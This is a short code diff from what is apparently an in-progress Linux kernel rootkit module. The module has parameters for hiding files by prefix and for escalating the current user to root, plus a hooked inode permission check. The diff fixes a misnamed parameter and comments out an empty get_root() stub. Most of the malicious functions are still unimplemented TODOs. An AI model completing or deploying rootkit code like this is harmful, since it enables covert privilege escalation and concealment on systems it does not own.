@@ -33,8 +33,8 @@ static char* hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0777);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 static bool escalate_privileges = false;
-module_param(escalate_root_priveleges, bool, 0777);
-MODULE_PARM_DESC(escalate_root_priveleges, "Toggle for escalating current user to root.");
+module_param(escalate_privileges, bool, 0777);
+MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
 
 // TODO: Figure out if this is needed at all.
 // /**
@@ -71,9 +71,9 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 /**
  * Gives the current user root priveleges.
  **/
-static void get_root() {
-    // TODO
-}
+// static void get_root() {
+//     // TODO
+// }
 
 /**
  * Rootkit module initialization.
@@ -98,9 +98,9 @@ static int __init rootkit_init(void) {
             // TODO: Set up hidden files.
         }
 
-        if (escalate_privileges) {
-            get_root();
-        }
+        // if (escalate_privileges) {
+        //     get_root();
+        // }
     }
 
     return 0;
